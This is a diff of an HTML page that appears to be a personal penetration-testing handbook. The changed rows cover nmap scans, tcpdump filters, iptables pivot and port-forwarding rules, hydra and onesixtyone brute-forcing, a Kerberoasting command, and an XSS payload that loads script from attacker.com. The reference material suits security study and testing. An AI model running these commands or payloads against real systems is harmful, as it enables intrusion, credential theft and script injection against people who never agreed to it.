@@ -6,7 +6,7 @@
   
   <meta http-equiv="content-type" content="text/html; charset=utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="description" content="Linux    Command Description     nmap -sV -p- -sU -o &amp;lt;IP&amp;gt; -oN nmap.txt All ports, Os fingerprint, UDP ports, Aggressive   nmap -T4 -v -oA myshares --script smb-enum-shares --script-args smbuser=,smbpass= -p445 [IP] Check for shares   nmap -sP &amp;lt;x.x.x.0&amp;gt;/24 nmap -sn &amp;lt;x.x.x.x&amp;gt;/24 Host discovery on a network   sudo nmap -PE -sn &amp;lt;x.x.x.x&amp;gt;/24 Host discovery on a network, better for windows as sometimes ICMP ping packets are dropped   nmap -R -sL -dns-server &amp;lt;server&amp;gt; x." />
+<meta name="description" content="Linux    Command Description     nmap -sV -p- -sU -o &amp;lt;IP&amp;gt; -oN nmap.txt All ports, Os fingerprint, UDP ports, Aggressive   nmap -T4 -v -oA myshares --script smb-enum-shares --script-args smbuser=,smbpass= -p445 [IP] Check for shares   nmap -sP &amp;lt;x.x.x.0&amp;gt;/24 nmap -sn &amp;lt;x.x.x.x&amp;gt;/24 Host discovery on a network   nmap -O -T5 -PE -F --osscan-limit --max-rtt-timeout 100ms --max-parallelism 100 --min-hostgroup 100 -oX out.xml -iL ip_networks." />
 <meta name="keywords" content="" />
 <meta name="robots" content="noodp" />
 <link rel="canonical" href="https://thomas-byrne.co.uk/projects/handbook/" />
@@ -201,6 +201,10 @@
 <td>Host discovery on a network</td>
 </tr>
 <tr>
+<td><code>nmap -O -T5 -PE -F --osscan-limit --max-rtt-timeout 100ms --max-parallelism 100 --min-hostgroup 100 -oX out.xml -iL ip_networks.txt</code></td>
+<td>Fast</td>
+</tr>
+<tr>
 <td><code>sudo nmap -PE -sn &lt;x.x.x.x&gt;/24</code></td>
 <td>Host discovery on a network, better for windows as sometimes ICMP ping packets are dropped</td>
 </tr>
@@ -273,7 +277,7 @@
 <td>Authoritative information of a domain</td>
 </tr>
 <tr>
-<td><code>tcpdump -i eth0 -XX out.pcap</code></td>
+<td><code>tcpdump -i eth0 -w out.pcap</code></td>
 <td>Capture packets on eth0 and write to file</td>
 </tr>
 <tr>
@@ -291,6 +295,26 @@
 <tr>
 <td><code>tcpdump -i eth0 -c 50 -tttt 'udp and port 53'</code></td>
 <td>Capture 50 DNS packets and print timestamp (use backticks not &lsquo;)</td>
+</tr>
+<tr>
+<td><code>tcpdump -x</code></td>
+<td>Hex output in packet capture</td>
+</tr>
+<tr>
+<td><code>tcpdump port &lt;port_number&gt;</code></td>
+<td>filter by port</td>
+</tr>
+<tr>
+<td><code>tcpdump portrange 21-45</code></td>
+<td>Filter port range</td>
+</tr>
+<tr>
+<td><code>tcpdump src &lt;x.x.x.x&gt; dst &lt;x.x.x.x&gt;</code></td>
+<td>filter by src/ destination of packets</td>
+</tr>
+<tr>
+<td><code>tcpdump -S</code></td>
+<td>get entire packet</td>
 </tr>
 <tr>
 <td><code>xwd -display &lt;ip&gt;:) -root -out /tmp/test.xpm</code></td>
@@ -314,7 +338,7 @@
 </tr>
 <tr>
 <td><code>iptables -L -v --line-numbers</code></td>
-<td>List all iptables rules with line numbers</td>
+<td>LIst all iptables rules with line numbers</td>
 </tr>
 <tr>
 <td><code>iptables -F</code></td>
@@ -322,7 +346,7 @@
 </tr>
 <tr>
 <td><code>iptables -P &lt;INPUT/FORWARD/OUTPUT&gt; &lt;ACCEPT/REJECT/DROP&gt;</code></td>
-<td>Change default policy for rules that don&rsquo;t match the rules</td>
+<td>CHange default policy for rules that don&rsquo;t match the rules</td>
 </tr>
 <tr>
 <td><code>iptables -A output -o &lt;iface&gt; -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT</code></td>
@@ -331,34 +355,6 @@
 <tr>
 <td><code>iptables -A INPUT -i &lt;iface&gt; -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT</code></td>
 <td>Allow SSH on port 22 OUTBOUND</td>
-</tr>
-<tr>
-<td><code>iptables -t nat -A PREROUTING -p tcp -i eth0 -j DNAT -d &lt;pivotip&gt; --dport 443 -to-destination &lt;attack_ip&gt;:443</code></td>
-<td>All 3 below are needed for port forwarding</td>
-</tr>
-<tr>
-<td><code>echo &quot;1&quot; &gt; /proc/sys/net/ipv4/ip_forward</code></td>
-<td>turn on ip forwarding</td>
-</tr>
-<tr>
-<td><code>iptables -t nat -A POSTROUTING -p tcp -i eth0 -j SNAT -s &lt;target subnet cidr&gt; -d &lt;attackip&gt; --dport 443 -to-source</code></td>
-<td></td>
-</tr>
-<tr>
-<td><code>iptables -t filter -I FORWARD 1 -j ACCEPT</code></td>
-<td></td>
-</tr>
-<tr>
-<td><code>sudo iptables -A FORWARD -i &lt;interface-between-box1&amp;2&gt; -o &lt;interface-between-box2&amp;3&gt; -j ACCEPT</code></td>
-<td>Forward traffic coming from interface 1 through interface 2</td>
-</tr>
-<tr>
-<td><code>sudo iptables -A FORWARD -i &lt;interface-between-box2&amp;3&gt; -o &lt;interface-between-box1&amp;2&gt; -m state --state ESTABLISHED,RELATE -j ACCEPT</code></td>
-<td>Forward traffic coming from interface 2 through to interface 1</td>
-</tr>
-<tr>
-<td><code>sudo iptables -t nat -A POSTROUTING -o &lt;interface-between-box2&amp;3&gt; -j MASQUERADE</code></td>
-<td>Masquerade source IP in TCP packets (for getting internet connection through a machine that has internet access)</td>
 </tr>
 <tr>
 <td><code>dig -x &lt;IP&gt;</code></td>
@@ -391,6 +387,34 @@
 <tr>
 <td><code>dig @nserver_kerberos.tcp.fqdn SRV +short</code></td>
 <td>Discover domain controllers</td>
+</tr>
+<tr>
+<td><code>echo &quot;1&quot; &gt; /proc/sys/net/ipv4/ip_forward</code></td>
+<td>turn on ip forwarding</td>
+</tr>
+<tr>
+<td><code>iptables -t nat -A PREROUTING -p tcp -i eth0 -j DNAT -d &lt;pivotip&gt; --dport 443 -to-destination &lt;attack_ip&gt;:443</code></td>
+<td>All 3 below needed for port forwarding</td>
+</tr>
+<tr>
+<td><code>iptables -t nat -A POSTROUTING -p tcp -i eth0 -j SNAT -s &lt;target subnet cidr&gt; -d &lt;attackip&gt; --dport 443 -to-source</code></td>
+<td></td>
+</tr>
+<tr>
+<td><code>iptables -t filter -I FORWARD 1 -j ACCEPT</code></td>
+<td></td>
+</tr>
+<tr>
+<td><code>sudo iptables -A FORWARD -i &lt;interface-between-box1&amp;2&gt; -o &lt;interface-between-box2&amp;3&gt; -j ACCEPT</code></td>
+<td>Forward traffic coming from interface 1 through interface 2</td>
+</tr>
+<tr>
+<td><code>sudo iptables -A FORWARD -i &lt;interface-between-box2&amp;3&gt; -o &lt;interface-between-box1&amp;2&gt; -m state --state ESTABLISHED,RELATE -j ACCEPT</code></td>
+<td>Forward traffic coming from interface 2 through to interface 1</td>
+</tr>
+<tr>
+<td><code>sudo iptables -t nat -A POSTROUTING -o &lt;interface-between-box2&amp;3&gt; -j MASQUERADE</code></td>
+<td>Masquerade source IP in TCP packets (for getting internet connection through a machine that has internet access)</td>
 </tr>
 <tr>
 <td><code>ssh -R &lt;anyPort&gt;:localhost:22 username@target</code> Then <code>ssh username@localhost -p&lt;port&gt;</code></td>
@@ -561,12 +585,20 @@
 <td></td>
 </tr>
 <tr>
+<td><code>onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt &lt;IP&gt;</code></td>
+<td>bruteforce SNMP, msfconsole, nmap and hydra can also be used</td>
+</tr>
+<tr>
 <td><code>rdesktop &lt;IP&gt;</code></td>
 <td>rdp into windows machine</td>
 </tr>
 <tr>
 <td><code>rlogin -l &lt;ip&gt;</code></td>
 <td>login with R* Services to server with rlogin port open - if misconfigured dont need a password</td>
+</tr>
+<tr>
+<td><code>hydra -l &lt;username&gt; -P &lt;password_file&gt; rlogin://&lt;Victim-IP&gt; -v -V</code></td>
+<td>bruteforce rlogin</td>
 </tr>
 <tr>
 <td><code>rexec &lt;ip&gt;</code></td>
@@ -639,6 +671,14 @@
 <tr>
 <td><code>remmina</code></td>
 <td>RDP option</td>
+</tr>
+<tr>
+<td><code>cat output.csv | sed 's/,/ ,/g' | column -t -s, | less -S</code></td>
+<td>View csv output in command line (use arrow keys to scroll horizontally)</td>
+</tr>
+<tr>
+<td><code>xq &lt;filename&gt;</code> <code>cat &lt;filename&gt; | xq</code></td>
+<td>jq but for xml files!!!!!</td>
 </tr>
 </tbody>
 </table>
@@ -713,6 +753,10 @@ finger x@$RHOST | base64 -d &gt; <span style="color:#e6db74">&#34;</span>$LFILE<
 <tr>
 <td><code>zoneadm -z &lt;zone_name&gt; install</code></td>
 <td>Basically like <code>docker pull &lt;image name&gt;</code></td>
+</tr>
+<tr>
+<td><code>showrev -P</code></td>
+<td>Patch information</td>
 </tr>
 </tbody>
 </table>
@@ -905,7 +949,7 @@ finger x@$RHOST | base64 -d &gt; <span style="color:#e6db74">&#34;</span>$LFILE<
 </tr>
 <tr>
 <td><code>netstat -ano</code></td>
-<td>Port scan</td>
+<td>Port scan, same as <code>netstat -tunlp</code></td>
 </tr>
 <tr>
 <td><code>sc query</code> <code>net start</code> <code>wmic service get name,startname</code> <code>Get-Service</code> OR <code>Get-Service | Where-Object {$_.Status -eq &quot;Running&quot;}</code></td>
@@ -1010,8 +1054,8 @@ print(server<span style="color:#f92672">.</span>info)
 <td></td>
 </tr>
 <tr>
-<td></td>
-<td></td>
+<td><code>GetUserSPNs.py &lt;domain_name&gt;/&lt;domain_user&gt;:&lt;domain_user_password&gt;</code></td>
+<td>technically an authenticated attack but usually done before network foothold</td>
 </tr>
 </tbody>
 </table>
@@ -1210,8 +1254,8 @@ print(server<span style="color:#f92672">.</span>info)
 <td>SSRF through PDF generator</td>
 </tr>
 <tr>
-<td></td>
-<td></td>
+<td><code>&lt;img src='s' onerror=&quot;$('body').append('&lt;script src=\'[http://attacker.com/xss.js](http://attacker.com/xss.js)\'&gt;')&quot;&gt;</code></td>
+<td>load malicious js payload from your malicious site (if inline scripts don&rsquo;t work)</td>
 </tr>
 </tbody>
 </table>
@@ -1244,6 +1288,12 @@ print(server<span style="color:#f92672">.</span>info)
 </table>
 <p><strong>ADD BLIND AND TIME BASED</strong></p>
 <h3 id="mssql">MSSQL<a href="#mssql" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<ul>
+<li>port TCP/1433, TCP/2433</li>
+<li>TCP/1434 Named instance</li>
+<li>UDP/1434 SQL Server Browse</li>
+<li>Password hashes are stored in <code>master.dbo.sysxlogins</code></li>
+</ul>
 <table>
 <thead>
 <tr>
@@ -1285,6 +1335,7 @@ print(server<span style="color:#f92672">.</span>info)
 <li><code>use auxiliary/scanner/oracle/sid_brute</code></li>
 </ul>
 </li>
+<li>Password hashes are stored in <code>sys.user$</code></li>
 </ul>
 <p><code>nmap -sSV -p1521 -n &lt;IP&gt;</code></p>
 <table>
